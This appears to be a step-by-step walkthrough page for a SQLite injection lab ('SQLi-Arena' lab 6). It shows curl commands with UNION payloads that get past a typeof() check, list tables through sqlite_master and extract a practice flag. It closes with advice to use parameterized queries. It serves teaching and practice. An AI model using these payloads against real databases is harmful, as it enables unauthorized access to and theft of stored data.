<h4>Step 1: Understand the typeof() Check</h4>
<p>The application runs <code>SELECT typeof(INPUT)</code> before the main query. Test normal behavior.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Integer Input</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=1"<br>
        <span class="prompt">Type Check: </span>SELECT typeof(1) =&gt; <strong>integer</strong><br>
        <span class="prompt">Main Query: </span>SELECT id, label, value FROM data_entries WHERE id = 1<br><br>
        <span class="prompt">Output:</span><br>
        id | label | value<br>
        1 | server_name | web-prod-01
    </div>
</div>

<h4>Step 2: Test typeof() with zeroblob()</h4>
<p><code>zeroblob(N)</code> creates N bytes of zero-filled blob data. SQLite evaluates it inside typeof().</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: zeroblob Type Check</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=zeroblob(1)"<br>
        <span class="prompt">Type Check: </span>SELECT typeof(zeroblob(1)) =&gt; <strong>blob</strong><br>
        <span class="prompt">Main Query: </span>No entry found with that ID.<br><br>
        <span class="prompt">// typeof() evaluates the SQL expression -- not the raw input string!</span>
    </div>
</div>

<h4>Step 3: Bypass typeof() with UNION Injection</h4>
<p>
    The type check runs <code>SELECT typeof(0 UNION SELECT ...)</code> which fails,
    but the main query still executes the UNION successfully.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. UNION Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT 1,2,3"<br>
        <span class="prompt">Type Check: </span><em>Type check: could not determine type</em> (typeof fails on UNION)<br>
        <span class="prompt">Main Query: </span>SELECT id, label, value FROM data_entries WHERE id = 0 UNION SELECT 1,2,3<br><br>
        <span class="prompt">Output:</span><br>
        id | label | value<br>
        1 | 2 | <strong>3</strong><br><br>
        <span class="prompt">// Type check failed but main query still executed! Validation is cosmetic.</span>
    </div>
</div>

<h4>Step 4: Enumerate Tables via sqlite_master</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT name, type, sql FROM sqlite_master WHERE type='table'"<br><br>
        <span class="prompt">Output:</span><br>
        id | label | value<br>
        data_entries | table | CREATE TABLE data_entries (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;label TEXT,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;value TEXT<br>
        )<br>
        <strong>system_config</strong> | table | CREATE TABLE system_config (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;config_key TEXT,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;config_value TEXT<br>
        )
    </div>
</div>

<h4>Step 5: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract from system_config</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT id, config_key, config_value FROM system_config"<br><br>
        <span class="prompt">Output:</span><br>
        id | label | value<br>
        1 | debug_mode | false<br>
        2 | master_flag | <strong>FLAG{sq_typ30f_z3r0bl0b}</strong><br>
        3 | max_connections | 100
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_typ30f_z3r0bl0b}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab6" \<br> --data-urlencode "id=0 UNION SELECT id, config_key, config_value FROM system_config"
    </div>
</div>

<h4>Bonus: typeof() Exploration</h4>
<p>Understanding SQLite's dynamic type system:</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Bonus. Type Exploration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>0 UNION SELECT typeof(1), typeof('hello'), typeof(zeroblob(10))<br><br>
        <span class="prompt">Output:</span><br>
        integer | text | blob
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>typeof()</code> evaluates the type of a SQL expression result,
    not the raw input string. Using typeof() as a "validator" is fundamentally flawed: it runs inside
    the SQL engine, after injection has already occurred. The type check query fails on UNION input,
    but the main query still executes. The only reliable defense is parameterized queries or strict
    PHP-side input validation (e.g., <code>ctype_digit()</code> or <code>intval()</code>).
</div>
